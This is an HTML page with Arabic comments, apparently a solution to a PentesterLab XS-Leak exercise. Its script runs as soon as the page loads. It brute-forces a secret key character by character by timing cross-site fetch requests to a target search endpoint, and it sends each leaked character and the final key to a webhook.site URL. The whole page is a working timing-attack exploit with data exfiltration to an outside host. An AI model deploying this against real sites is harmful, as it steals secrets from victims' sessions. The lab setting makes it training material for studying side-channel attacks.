<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>XS-Leak Attack - PentesterLab</title>
</head>
<body>
    <h1 style="color: red;">جاري تنفيذ هجوم XS-Leak...</h1>
    <div id="results">
        <p>المفتاح المستخرج حالياً: <span id="key" style="font-weight: bold; color: blue;">-</span></p>
        <p>آخر محاولة: <span id="attempt">-</span></p>
    </div>

    <script>
        const TARGET_URL = "http://ptl-41f731a5e034-c2c22805e34a.libcurl.me/search?search=";
        const WEBHOOK_URL = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
        const CHARSET = "0123456789-abcdef";
        const THRESHOLD = 1300; // الحد الفاصل بناءً على ملاحظتك (1330ms للمطابق)
        
        let leakedKey = "";

        async function measureTime(url) {
            // إضافة parameter عشوائي لتجنب الكاش (Cache Busting)
            const finalUrl = `${url}&_t=${Math.random()}`;
            const start = performance.now();
            
            try {
                // استخدام fetch مع no-cors لعمل الطلب عبر المواقع
                await fetch(finalUrl, { mode: 'no-cors', cache: 'no-cache' });
            } catch (e) {
                // أخطاء الـ CORS لا تهمنا، ما يهمنا هو الوقت المستغرق
            }
            
            return performance.now() - start;
        }

        async function startExploit() {
            // الـ UUID عادة يتكون من 36 حرفاً
            for (let i = 0; i < 36; i++) {
                for (let char of CHARSET) {
                    const currentTry = leakedKey + char;
                    document.getElementById("attempt").innerText = currentTry;

                    // نختبر الحرف باستخدام الـ caret ^ كما هو مطلوب في التمرين
                    const timeTaken = await measureTime(`${TARGET_URL}${currentTry}^`);
                    
                    console.log(`Testing: ${currentTry} | Time: ${timeTaken.toFixed(2)}ms`);

                    if (timeTaken >= THRESHOLD) {
                        leakedKey += char;
                        document.getElementById("key").innerText = leakedKey;
                        
                        // إرسال الحرف الذي تم العثور عليه إلى الـ Webhook الخاص بك فوراً
                        fetch(`${WEBHOOK_URL}?found=${leakedKey}&time=${timeTaken.toFixed(2)}`);
                        
                        // ننتقل للحرف التالي في السلسلة
                        break; 
                    }
                }
            }
            
            // إرسال النتيجة النهائية
            fetch(`${WEBHOOK_URL}?final_key=${leakedKey}`);
            alert("تم استخراج المفتاح بالكامل: " + leakedKey);
        }

        // بدء الهجوم
        startExploit();
    </script>
</body>
</html>
